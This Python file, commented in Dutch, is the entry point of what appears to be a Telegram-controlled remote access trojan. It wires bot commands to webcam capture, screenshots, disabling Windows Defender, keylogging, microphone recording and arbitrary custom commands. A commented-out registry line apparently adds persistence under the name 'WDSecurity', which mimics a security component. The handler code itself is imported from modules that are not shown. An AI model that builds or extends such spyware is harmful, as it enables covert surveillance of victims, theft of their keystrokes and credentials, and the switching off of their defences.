# In deze file wordt de bot opgestart en luister hij  naar commands
import os
from dotenv import load_dotenv
from typing import Final
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from organisms import *
from atoms import add_to_registry


# Voeg de script toe aan registry
# add_to_registry("WDSecurity")

load_dotenv()
API_TOKEN: Final = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = int(os.getenv("CHAT_ID"))

# on_startup functie heeft await nodig
async def on_startup(_):
    await startup_functions(app, CHAT_ID)

# source: https://levelup.gitconnected.com/building-a-telegram-bot-in-2024-with-python-17b483a7f6b9#:~:text=Let%E2%80%99s%20now%20continue!-,3.%20main.py,-Create%20a%20new
app = Application.builder().token(API_TOKEN).build()

# startup functies aanroepen
app.post_init = on_startup

# Register command handlers
app.add_handler(CommandHandler('help', help_command))
app.add_handler(CommandHandler('webcam', cam_command))
app.add_handler(CommandHandler('ss', ss_command))
app.add_handler(CommandHandler('stopdefender', stopDefender_command))
app.add_handler(CommandHandler('keylog', keylog_command))
app.add_handler(CommandHandler('listen', audio_command))
app.add_handler(CommandHandler('cc', custom_command))

# Register message handler
app.add_handler(MessageHandler(filters.TEXT, no_command))

# Register error handler 
app.add_error_handler(log_error)

print('Bot is ready')
 # Run the bot
app.run_polling(poll_interval=2)